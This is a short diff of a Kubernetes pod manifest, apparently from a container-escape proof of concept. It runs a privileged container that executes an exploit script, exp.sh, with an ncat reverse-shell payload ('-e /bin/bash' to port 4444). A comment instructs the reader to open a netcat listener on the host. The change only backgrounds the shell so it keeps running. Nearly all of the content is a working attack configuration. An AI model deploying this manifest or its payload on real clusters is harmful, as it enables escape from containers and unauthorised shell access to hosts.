@@ -9,7 +9,7 @@ spec:
     securityContext:
       privileged: true
     command: ["/bin/sh"]
-    args: ["-c", "sed -i \"s|/etc/mtab|/proc/self/mounts|g\" exp.sh; chmod +x exp.sh && ./exp.sh 'ncat -nv 127.0.0.1 4444 -e /bin/bash '; sleep infinity"]
+    args: ["-c", "sed -i \"s|/etc/mtab|/proc/self/mounts|g\" exp.sh; chmod +x exp.sh && ./exp.sh 'nohup ncat -nv 127.0.0.1 4444 -e /bin/bash > /dev/null 2>&1 &'; sleep infinity"]
 
     #before running this, make sure to run the following command on the host:
     #nc -lvp 4444
